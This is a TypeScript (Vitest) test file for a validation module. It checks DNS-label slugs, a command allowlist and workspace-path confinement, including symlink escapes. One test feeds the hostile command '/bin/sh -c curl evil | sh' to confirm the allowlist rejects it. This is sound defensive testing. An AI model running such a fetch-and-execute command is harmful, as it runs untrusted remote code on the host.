import { mkdirSync, mkdtempSync, rmSync, symlinkSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { describe, expect, it } from "vitest"

import {
  assertAllowedCommand,
  assertValidHostnameLabel,
  ensureWorkspacePath,
  resolveWorkspacePath,
  slugify,
} from "@/features/pills/validation"

describe("pill validation", () => {
  it("slugifies names for DNS labels", () => {
    expect(slugify("Example Dev App!")).toBe("example-dev-app")
  })

  it("rejects invalid hostname labels", () => {
    expect(() => assertValidHostnameLabel("-bad")).toThrow(/valid DNS label/)
  })

  it("allows any command when the allowlist is empty", () => {
    expect(() =>
      assertAllowedCommand(["/bin/sh", "-c", "echo"], [])
    ).not.toThrow()
  })

  it("allows a bare command or an exact full path in the allowlist", () => {
    expect(() =>
      assertAllowedCommand(["bun", "run", "dev"], ["bun"])
    ).not.toThrow()
    expect(() =>
      assertAllowedCommand(
        ["/usr/local/bin/node", "server.js"],
        ["/usr/local/bin/node"]
      )
    ).not.toThrow()
  })

  it("rejects path-qualified executables that only match by basename", () => {
    expect(() => assertAllowedCommand(["./node", "x"], ["node"])).toThrow(
      /not in the configured/
    )
    expect(() => assertAllowedCommand(["/tmp/node"], ["node"])).toThrow(
      /not in the configured/
    )
  })

  it("rejects commands outside the allowlist", () => {
    expect(() =>
      assertAllowedCommand(["/bin/sh", "-c", "curl evil | sh"], ["bun", "node"])
    ).toThrow(/not in the configured/)
  })

  it("rejects paths outside workspace roots", () => {
    const root = mkdtempSync(join(tmpdir(), "upster-root-"))
    const outside = mkdtempSync(join(tmpdir(), "upster-outside-"))

    try {
      expect(() => ensureWorkspacePath(outside, [root])).toThrow(
        /outside the configured/
      )
    } finally {
      rmSync(root, { recursive: true, force: true })
      rmSync(outside, { recursive: true, force: true })
    }
  })

  it("rejects symlinks that escape the workspace roots", () => {
    const root = mkdtempSync(join(tmpdir(), "upster-root-"))
    const outside = mkdtempSync(join(tmpdir(), "upster-outside-"))
    const link = join(root, "escape")

    try {
      symlinkSync(outside, link)
      expect(() => ensureWorkspacePath(link, [root])).toThrow(
        /outside the configured/
      )
    } finally {
      rmSync(root, { recursive: true, force: true })
      rmSync(outside, { recursive: true, force: true })
    }
  })

  it("translates host workspace paths to mounted container paths", () => {
    const hostRoot = mkdtempSync(join(tmpdir(), "upster-host-"))
    const containerRoot = mkdtempSync(join(tmpdir(), "upster-container-"))
    const containerProject = join(containerRoot, "apps", "sample")

    mkdirSync(containerProject, { recursive: true })

    try {
      expect(
        resolveWorkspacePath(
          join(hostRoot, "apps", "sample"),
          [containerRoot],
          hostRoot
        )
      ).toBe(containerProject)
      expect(
        ensureWorkspacePath(
          join(hostRoot, "apps", "sample"),
          [containerRoot],
          hostRoot
        )
      ).toBe(containerProject)
    } finally {
      rmSync(hostRoot, { recursive: true, force: true })
      rmSync(containerRoot, { recursive: true, force: true })
    }
  })
})
